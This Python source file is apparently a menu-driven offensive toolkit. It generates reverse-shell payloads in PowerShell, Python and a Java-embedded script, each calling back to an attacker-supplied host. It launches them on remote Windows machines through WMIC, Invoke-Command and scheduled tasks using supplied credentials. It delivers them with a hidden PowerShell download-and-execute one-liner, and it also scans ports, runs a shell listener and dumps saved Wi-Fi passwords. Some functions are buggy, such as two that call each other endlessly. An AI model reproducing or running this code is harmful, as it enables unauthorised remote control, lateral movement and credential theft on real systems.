import os
import re
import threading
import time
import sys
import uuid
import socket
import subprocess
from concurrent.futures import ThreadPoolExecutor, as_completed



class Payload:
    def __init__(self, lhost, lport):
        self.lhost = lhost
        self.lport = lport

    def template_powershell(self):
        return f"""
$LHOST = '{self.lhost}'; 
$LPORT = '{self.lport}'; 
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); 
$NetworkStream = $TCPClient.GetStream(); 
$StreamReader = New-Object IO.StreamReader($NetworkStream); 
$StreamWriter = New-Object IO.StreamWriter($NetworkStream); 
$StreamWriter.AutoFlush = $true; 
$Buffer = New-Object System.Byte[] 1024; 
while ($TCPClient.Connected) {{ 
    while ($NetworkStream.DataAvailable) {{ 
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); 
        $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData - 1) 
    }}; 
    if ($TCPClient.Connected -and $Code.Length -gt 1) {{ 
        $Output = try {{ 
            Invoke-Expression ($Code) 2>&1 
        }} catch {{ $_ }}; 
        $StreamWriter.Write("$Output`n"); 
        $Code = $null 
    }} 
}}; 
$TCPClient.Close(); 
$NetworkStream.Close(); 
$StreamReader.Close(); 
$StreamWriter.Close()
"""

    def template_python(self):
        return f"""
import os, socket, subprocess, threading

def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{self.lhost}", {self.lport}))

p = subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
"""

    def template_javascript(self):
        return f'''
String command = "var host = '{self.lhost}';" +
               "var port = {self.lport};" +
               "var cmd = 'powershell';" +
               "var s = new java.net.Socket(host, port);" +
               "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();" +
               "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();" +
               "var po = p.getOutputStream(), so = s.getOutputStream();" +
               "print ('Connected');" +
               "while (!s.isClosed()) {{" +
               "    while (pi.available() > 0)" +
               "        so.write(pi.read());" +
               "    while (pe.available() > 0)" +
               "        so.write(pe.read());" +
               "    while (si.available() > 0)" +
               "        po.write(si.read());" +
               "    so.flush();" +
               "    po.flush();" +
               "    java.lang.Thread.sleep(50);" +
               "    try {{" +
               "        p.exitValue();" +
               "        break;" +
               "    }}" +
               "    catch (e) {{" +
               "    }}" +
               "}}" +
               "p.destroy();" +
               "s.close();";
String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
ref.add(new StringRefAddr("x", x));
'''



class ExecutePayload:
    def __init__(self, rhost, ruser, rpass, fpath):
        self.rhost = rhost
        self.ruser = ruser
        self.rpass = rpass
        self.fpath = fpath

    def execute(self, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if process.returncode == 0:
                print(f"Command executed successfully:\n\n{stdout.decode()}")
            else:
                print(f"Error executing command:\n\n{stderr.decode()}")
        except Exception as e:
            print(f"An error occurred: {e}")

    def execute_wmic(self):
        command = f"wmic /node:{self.rhost} /user:{self.ruser} /password:{self.rpass} process call create 'powershell.exe -ExecutionPolicy Bypass -NoProfile -File {self.fpath}'"
        self.execute(command)

    def execute_powershell(self):
        command = f"""
        $username = '{self.ruser}';
        $password = ConvertTo-SecureString '{self.rpass}' -AsPlainText -Force;
        $credential = New-Object System.Management.Automation.PSCredential($username, $password);
        Invoke-Command -ComputerName '{self.rhost}' -FilePath '{self.fpath}' -Credential $credential
        """
        self.execute(command)

    def execute_taskscheduler1(self):
        time = input("Time: ")
        taskname = f"{uuid.uuid4().hex}"
        command = f"schtasks /create /tn {taskname} /tr powershell.exe -ExecutionPolicy Bypass -File {self.fpath} /sc once /st {time} /S {self.rhost} /U {self.ruser} /P {self.rpass}"
        self.execute(command)

    def execute_taskscheduler2(self):
        time = input("Time: ")
        taskname = f"{uuid.uuid4().hex}"
        
        command = f"""
$username = '{self.ruser}'
$password = ConvertTo-SecureString '{self.rpass}' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($username, $password)

$action = New-ScheduledTaskAction -Execute "{self.fpath}"
$trigger = New-ScheduledTaskTrigger -Once -At "{time}"

Invoke-Command -ComputerName '{self.rhost}' -Credential $cred -ScriptBlock {{
    param ($action, $trigger)
    Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "{taskname}"
}} -ArgumentList $action, $trigger
"""
        self.execute(command)

    @staticmethod
    def start_listener(host, port):
        print(Misc.title('listener'))
        port = int(port)
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.bind((host, port))
        server_socket.listen(1)
        print(f"Listening on {host}:{port}...")

        client_socket, addr = server_socket.accept()
        
        Misc.cls()
        print(Misc.title('shell'))
        print(f"Connection received from {addr[0]}:{addr[1]}")

        while True:
            command = input('\n~$ ')
            if command.lower() == 'exit':
                client_socket.send(b'exit\n')
                break

            client_socket.send((command + '\n').encode())

            output = client_socket.recv(4096).decode().strip()
            print(output)

        client_socket.close()
        server_socket.close()

    

class DeliverPayload:
    def __init__(self, rhost, ruser, rpass, fname):
        self.rhost = rhost
        self.ruser = ruser
        self.rpass = rpass
        self.fname = fname

    def get_wlan_ipv4_address():
        try:
            result = subprocess.run(['ipconfig'], capture_output=True, text=True)
            wifi_pattern = re.compile(r'Wireless LAN adapter WiFi[\s\S]*?IPv4 Address[^\:]*[:\s]+([\d]+\.[\d]+\.[\d]+\.[\d]+)')
            match = wifi_pattern.search(result.stdout)

            if match:
                return match.group(1)
            else:
                return "IPv4 address for Wireless LAN adapter WiFi not found"
        
        except Exception as e:
            return f"Error occurred: {e}"

    def wmic_server(self):
        def start_server(ip, port):
            print(f"\nStarting server http://{ip}:{port}\n")
            with open(os.devnull, 'w') as devnull:
                subprocess.Popen(["python3", "-m", "http.server", port], stdout=devnull)
        ip = DeliverPayload.get_wlan_ipv4_address()
        print(f"\nLHOST: {ip}")
        port = input("SERVER PORT: ")
        server_thread = threading.Thread(target=start_server(ip, port), daemon=True)
        server_thread.start()

        domain = f"http://{ip}:{port}/{self.fname}"

        command = (
            f"wmic /node:{self.rhost} /user:{self.ruser} /password:{self.rpass} "
            f"process call create \"cmd.exe /c powershell -nop -w hidden -c "
            f"IEX(New-Object Net.WebClient).DownloadString('{domain}')\""
        )
        ExecutePayload.execute(self, command)

    

class Discovery:
    @staticmethod
    def scan_port(ip, port, timeout=0.1):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            if result == 0: 
                service = Discovery.get_service_name(port)
                return port, result 
            else:
                return port, result 

    @staticmethod
    def scan_all_port(ip, start_port, end_port, batch_size=1024, timeout=0.1):
        open_ports = set()
        total_ports = end_port - start_port + 1
        scanned_ports = 0

        for batch_start in range(start_port, end_port + 1, batch_size):
            batch_end = min(batch_start + batch_size - 1, end_port)
            with ThreadPoolExecutor(max_workers=200) as executor: 
                futures = {executor.submit(Discovery.scan_port, ip, port, timeout): port for port in range(batch_start, batch_end + 1)}

                for future in as_completed(futures):
                    port = futures[future]
                    try:
                        port, result = future.result()  
                        if result == 0: 
                            open_ports.add(port)
                    except socket.error as e:
                        print(f"Socket error scanning port {port}: {e}")
                    except Exception as e:
                        print(f"Error scanning port {port}: {e}")

                    scanned_ports += 1
                    Misc.loading_bar(total_ports, scanned_ports)
        print()            
        if open_ports:  
            print("\nPORT    STATE     SERVICE")
            for port in sorted(open_ports):
                service = Discovery.get_service_name(port)
                print(f"{port:<8} Open     {service:<15}") 
        else:
            print("No open ports found.")

    @staticmethod
    def get_service_name(port, banner=None):
        service_map = {
            135: "msrpc/epmap",
            5985: "winrm",
            902 : "vsphere/exsi",
            912 : "apex-mesh",
        }

        if port in service_map:
            return service_map[port]
        
        try:
            service = socket.getservbyport(port, 'tcp')
            if banner:
                return f"{service} ({banner})" 
            return service
        except OSError:
            return ""



class PostExploitation:
    @staticmethod
    def get_wifi_pass():
        try:
            profiles_data = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
        except subprocess.CalledProcessError as e:
            print("Error retrieving profiles:", e)
            return {}
        
        profiles = re.findall(r"All User Profile\s*:\s*(.*)", profiles_data)

        wifi_passwords = {}
        for profile in profiles:
            profile = profile.strip()

            try:
                profile_info = subprocess.check_output(f'netsh wlan show profile name="{profile}" key=clear', shell=True).decode("utf-8", errors="ignore")
            except subprocess.CalledProcessError as e:
                print(f"Error retrieving profile info for {profile}:", e)
                continue
            
            password_match = re.search(r"Key Content\s*:\s*(.*)", profile_info)
            wpass = password_match.group(1) if password_match else "No password set"

            wifi_passwords[profile] = wpass

            PostExploitation.display_Wifi_pass(wifi_passwords)

    @staticmethod
    def display_Wifi_pass(wifi_passwords):
        gap = 15
        wifi_passwords = PostExploitation.get_wifi_pass()

        print(f"\n{'PROFILE':<{gap}}  {'PASSWORD'}")
        for profile, wpass in wifi_passwords.items():
            wprofile = profile[:gap] + ('...' if len(profile) > gap else '')
            print(f"{wprofile:<{gap}}  {wpass}")
    


class Shell:
    @staticmethod
    def shell(command):
        command = command.strip()
        if command.startswith("xp -ls"):
            try:
                lport = int(command.split()[-1])
                ExecutePayload.start_listener('0.0.0.0', lport)
            except ValueError:
                print("Invalid param. Use: xp -ls <port>")
        elif command.startswith("xp -sc"):
            try:
                rhost = command.split()[-1]
                print(Misc.title('scanner'))
                Discovery.scan_all_port(rhost, 1, 65000)
            except Exception as e:
                print("Invalid param. Use: xp -sc <ip>")
        else:
            print("Invalid command")
            Menu.main_menu()
        


class Menu:
    @staticmethod
    def main_menu():
        try:
            option = Menu.prepare_module("main")
            
            Misc.cls()

            menu = {
                "1": Menu.__payload_menu,
                "2": Menu.__deliver_menu,
                "3": Menu.__execute_menu,
                "4": Menu.__scan_menu,
                "5": Menu.__listener_menu,
            }

            if option.upper() == "X":
                exit(0)
            elif option.startswith("xp"):
                Shell.shell(option)
            elif option in menu:
                menu[option]()
            else:
                print("Invalid option. Please enter 1, 2, 3, 4, 5, or X.")
                Menu.main_menu()

        except KeyboardInterrupt:         
            print("Interrupted")
            exit(0)

    @staticmethod
    def __payload_menu():
        option = Menu.prepare_module("generator")

        if option.upper() == 'X':
            return Menu.main_menu()

        menu = {
            '1': ("template_powershell", ".ps1"),
            '2': ("template_python", ".py"),
            '3': ("template_javascript", ".js")
        }

        if option not in menu:
            Misc.cls()
            print("\nInvalid option for payload type.")
            return Menu.__payload_menu()

        lhost = input("\nLHOST: ")
        lport = input("LPORT: ")
        fname = input("FNAME: ")

        generate = Payload(lhost, lport)

        template_method_name, file_extension = menu[option]
        template_method = getattr(generate, template_method_name, None)

        if template_method:
            payload = template_method()
            fname += file_extension
        else:
            print("\nError: Unable to generate the payload.")
            return Menu.__payload_menu()

        with open(fname, 'w') as file:
            file.write(payload)

        full_path = os.path.abspath(fname)
        print(f"\nPayload has been saved to {full_path}")


    @staticmethod
    def __execute_menu():
        option = Menu.prepare_module("execute")
        
        if option.upper() == 'X':
            return Menu.main_menu()
            
        menu = {
            '1': 'execute_wmic',
            '2': 'execute_powershell',
            '3': 'execute_taskscheduler1',
            '4': 'execute_taskscheduler2'
        }
        
        if option not in menu:
            Misc.cls()
            print("Invalid option for execution type.")
            return Menu.__execute_menu()
        
        rhost = input("\nRHOST: ")
        ruser = input("RUSER: ")
        rpass = input("RPASS: ")
        fpath = input("FPATH: ")
        
        execute = ExecutePayload(rhost, ruser, rpass, fpath)
        
        execute_method = getattr(execute, menu[option], None)
        if execute_method:
            execute_method()
        else:
            print("Invalid option.")
            return Menu.__execute_menu()


    @staticmethod
    def __deliver_menu():
        option = Menu.prepare_module("deliver")

        if option.upper() == 'X':
            return Menu.main_menu()

        menu = {
            '1': "wmic_server",
            '2': "wmic_server"
        }

        if option not in menu:
            Misc.cls()
            print("Invalid option for execution type.")
            return Menu.__deliver_menu()

        rhost = input("\nRHOST: ")
        ruser = input("RUSER: ")
        rpass = input("RPASS: ")
        fname = input("FNAME: ")

        deliver = DeliverPayload(rhost, ruser, rpass, fname)

        delivery_method = getattr(deliver, menu[option], None)

        if delivery_method:
            delivery_method()
        else:
            print("Invalid option.")
            return Menu.__deliver_menu()


    @staticmethod
    def __scan_menu():
        option = Menu.prepare_module("scanner")

        if option.upper() == 'X':
            return Menu.main_menu()

        menu = {
            '1': "scan_port",
            '2': "scan_all_port"
        }

        if option not in menu:
            Misc.cls()
            print("Invalid option for scan type.")
            return Menu.__scan_menu()

        ip = input("\nIP: ")

        if option == '1':
            port = int(input("Port: "))
            start_time = time.time()
            port, result = Discovery.scan_port(ip, port) 

            if result == 0:
                service = Discovery.get_service_name(port)
                print("\nPORT    STATE     SERVICE")
                print(f"{port:<8} Open     {service:<15}") 
            else:
                print(f"Port {port} is Closed")
        elif option == '2':
            start_port = int(input("Start port (default: 1): ") or "1")
            end_port = int(input("End port (default: 65535): ") or "65535")
            start_time = time.time()
            print()
            Discovery.scan_all_port(ip, start_port, end_port)

        end_time = time.time()
        elapsed_time = end_time - start_time

        print(f"\nScan Time: {elapsed_time:.2f} seconds")
        input("\nPress enter to continue...")
        return Menu.main_menu()


    @staticmethod
    def __listener_menu():
        Menu.prepare_module("listener")
        lport = input("LPORT: ")
        Misc.cls()
        ExecutePayload.start_listener('0.0.0.0', lport)

    def menu(module):
        menus = {
            "main": "1 - Generate Payload\n2 - Deliver Payload\n3 - Execute Payload\n4 - Port Scan\n5 - Listener\nX - Exit",
            "generator": "1 - Powershell\n2 - Python\n3 - Javascript\nX - Back",
            "deliver": "1 - WMIC Server\n2 - PowerShell\nX - Back",
            "execute": "1 - WMIC\n2 - PowerShell\n3 - Task Scheduler 1\n4 - Task Scheduler 2\nX - Back",
            "scanner": "1 - Single Port\n2 - All Ports\nX - Back",
            "listener": "",
        }
        return menus.get(module, "")
    
    def prepare_module(module):
        Misc.cls()
        print(Misc.title(module))
        if module == "listener":
            print(Menu.menu(module))
            return
        print(Menu.menu(module))
        return input("\nOption: ")

   
    
class Misc:
    @staticmethod
    def cls():
        os.system('cls' if os.name == 'nt' else 'clear')

    @staticmethod
    def loading_bar(total, current):
        bar_length = 40 
        percent = (current / total)
        arrow = '█' * int(round(percent * bar_length))
        spaces = ' ' * (bar_length - len(arrow))
        sys.stdout.write(f'\rProgress: |{arrow}{spaces}| {percent * 100:.2f}% Complete')
        sys.stdout.flush()

    @staticmethod
    def title(type):
        if type == "main":
            return r"""
┏┓┏┓┏┓┏┓┏┓┓ ┏┓┳┏┳┓
┣  ┃┃ ┣ ┃┃┃ ┃┃┃ ┃ 
┗┛┗┛┗┛┗┛┣┛┗┛┗┛┻ ┻ 
"""

        elif type == "shell":
            return r"""
┏┓┓┏┏┓┓ ┓   ┏┓┏┓┏┓┏┓┳┏┓┳┓
┗┓┣┫┣ ┃ ┃   ┗┓┣ ┗┓┗┓┃┃┃┃┃
┗┛┛┗┗┛┗┛┗┛  ┗┛┗┛┗┛┗┛┻┗┛┛┗                                                  
"""
        
        elif type == "generator":
            return r"""  
┏┓┏┓┓┏┓ ┏┓┏┓┳┓  ┏┓┏┓┳┓
┃┃┣┫┗┫┃ ┃┃┣┫┃┃  ┃┓┣ ┃┃
┣┛┛┗┗┛┗┛┗┛┛┗┻┛  ┗┛┗┛┛┗                                                          
"""

        elif type == "deliver":
            return r"""
┏┓┏┓┓┏┓ ┏┓┏┓┳┓  ┳┓┏┓┓ ┳┓┏┏┓┳┓┓┏
┃┃┣┫┗┫┃ ┃┃┣┫┃┃  ┃┃┣ ┃ ┃┃┃┣ ┣┫┗┫
┣┛┛┗┗┛┗┛┗┛┛┗┻┛  ┻┛┗┛┗┛┻┗┛┗┛┛┗┗┛            
            """

        elif type == "execute":
            return r"""
┏┓┏┓┓┏┓ ┏┓┏┓┳┓  ┏┓┏┓┏┓┏┓┏┓
┃┃┣┫┗┫┃ ┃┃┣┫┃┃  ┣  ┃┃ ┣ ┃ 
┣┛┛┗┗┛┗┛┗┛┛┗┻┛  ┗┛┗┛┗┛┗┛┗┛               
"""

        elif type == "scanner":
            return r"""
┏┳┓┏┓┏┓  ┏┓┏┓┏┓┳┓
 ┃ ┃ ┃┃  ┗┓┃ ┣┫┃┃
 ┻ ┗┛┣┛  ┗┛┗┛┛┗┛┗
"""

        elif type == "listener":
            return r"""
┓ ┳┏┓┏┳┓┏┓┳┓┏┓┳┓
┃ ┃┗┓ ┃ ┣ ┃┃┣ ┣┫
┗┛┻┗┛ ┻ ┗┛┛┗┗┛┛┗ 
"""



Menu.main_menu()

